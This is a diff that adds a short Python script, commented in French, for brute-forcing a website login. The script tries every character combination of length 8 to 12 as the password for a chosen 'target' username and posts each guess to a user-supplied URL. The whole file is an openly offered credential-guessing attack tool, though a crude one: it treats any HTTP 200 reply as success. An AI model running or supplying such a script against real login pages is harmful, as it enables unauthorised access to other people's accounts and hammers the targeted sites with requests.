@@ -1,0 +1,47 @@
+import requests
+import itertools
+
+def tester_mot_de_passe(url, username, types_permis):
+    while True:
+        alphabet_minuscules = [chr(i) for i in range(97, 123)]
+        alphabet_majuscules = [chr(i) for i in range(65, 91)]
+        nombres = [str(i) for i in range(10)]
+        caracteres_speciaux = ['!', '@', '#', '$', '%', '^', '&', '*', '(', ')', '_', '-', '+', '=', '{', '}', '[', ']', '|', '\\', ';', ':', "'", '"', '<', '>', ',', '.', '/', '?']
+
+        liste_de_caracteres = []
+        
+        if 'lettres' in types_permis:
+            liste_de_caracteres += alphabet_minuscules + alphabet_majuscules
+        if 'nombres' in types_permis:
+            liste_de_caracteres += nombres
+        if 'speciaux' in types_permis:
+            liste_de_caracteres += caracteres_speciaux
+
+        longueur_minimale = 8  # Longueur minimale du mot de passe
+        longueur_maximale = 12  # Longueur maximale du mot de passe
+        
+        for longueur_mot_de_passe in range(longueur_minimale, longueur_maximale + 1):
+            for combinaison in itertools.product(liste_de_caracteres, repeat=longueur_mot_de_passe):
+                mot_de_passe = ''.join(combinaison)
+                data = {
+                    'username': username,
+                    'password': mot_de_passe
+                }
+                
+                response = requests.post(url, data=data)
+                
+                if response.status_code == 200:
+                    print("Le mot de passe est " + mot_de_passe)
+                    print("Contenu de la réponse :")
+                    print(response.text)
+                    return  # Sortir de la fonction une fois que le mot de passe est trouvé
+
+                print("Mot de passe testé : " + mot_de_passe)
+
+# Demander les informations à l'utilisateur
+url = input("Quelle est l'URL du site web que vous souhaitez brute forcer ? ")
+username = input("Quel est le nom d'utilisateur de la cible ? ")
+types_permis = input("Quels types de caractères voulez-vous inclure dans le mot de passe ? (lettres/nombres/speciaux, séparés par des espaces) ").split()
+
+# Appeler la fonction pour tester les mots de passe
+tester_mot_de_passe(url, username, types_permis)
